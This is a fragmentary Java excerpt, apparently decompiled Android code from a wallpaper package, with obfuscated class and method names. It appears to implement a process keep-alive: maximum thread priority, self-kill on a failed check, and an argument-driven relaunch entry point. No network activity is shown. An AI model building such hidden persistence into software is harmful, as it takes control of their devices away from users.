...
import com.wallpaper.qudigks.Gsujgiskgkmj;
...
public class Queisjgkslgs {
    ...
    public class a extends Thread {
        ...
        public void run() {
            ...
            try {
                gZxOsWPgZMye.NwDDHF(Queisjgkslgs.this.f12218h.f12226a[this.f12219a]);
            } catch (Exception e) {
            }
            if(!Tiusjgjskg.g()) {
            ...
            gZxOsWPgZMye.CgXGeNnUOIVR(Queisjgkslgs.this);
            Process.killProcess(Process.myPid());
        }
    }

    public Queisjgkslgs(Qyeusjgies aegisParcel) {
...
//    @Keep
    public static void main(String[] strArr) {
        ...
        try {
            String str = strArr[0];
            if (!TextUtils.isEmpty(str) && (a2 = Qyeusjgies.a(str)) != null) {
                new Queisjgkslgs(a2).b();
            }
        } catch (Exception e2) {
        }
    }
//    @Keep
    ...
    public final void b() {
        try {
            ...
            Process.setThreadPriority(-20);
            try {
                gZxOsWPgZMye.NwDDHF(this.f12218h.f12226a[0]);
            } catch (Exception e) {
            }
            if(!Tiusjgjskg.g()) {
                Process.killProcess(Process.myPid());
...
//    @Keep
    ...
    public final Parcel g(int idex) {
        try {
